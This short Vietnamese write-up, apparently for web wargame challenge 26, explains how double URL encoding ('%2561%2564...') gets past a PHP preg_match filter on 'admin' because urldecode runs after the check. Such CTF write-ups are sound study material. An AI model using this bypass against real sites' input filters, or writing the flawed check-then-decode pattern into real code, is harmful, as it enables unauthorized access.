@@ -1,0 +1,21 @@
+phân tích source code ta thấy:
+
+if(preg_match("/admin/",$_GET['id'])) { echo"no!"; exit(); }
+$_GET['id'] = urldecode($_GET['id']);
+if($_GET['id'] == "admin"){
+  solve(26);
+
+tiến hành thực hiện payload:
+?id=admin
+=> điều này đã bị chặn
+sử dụng url encode
+?id=%61%64%6d%69%6e
+=> nhận thấy rằng khi gửi đi đã bị encode thành "admin"
+ta thấy rằng trong source code có hàm "urldecode()" ta sẽ lợi dụng hàm này để tiến hành bypass hàm "preg_match"
+=> ta sẽ encode 2 lần "admin"
+lần 1: %61%64%6d%69%6e
+lần 2: %2561%2564%256d%2569%256e ( lúc này ta encode % =? %25)
+=> khi gửi payload ?id=%2561%2564%256d%2569%256e lần urldecode đầu tiên sẽ thu được
+id=%61%64%6d%69%6e và vượt qua hàm "preg_match" 
+=> sau đó đi qua hàm urldecode() sẽ thu được id=admin
+=>payload thành công
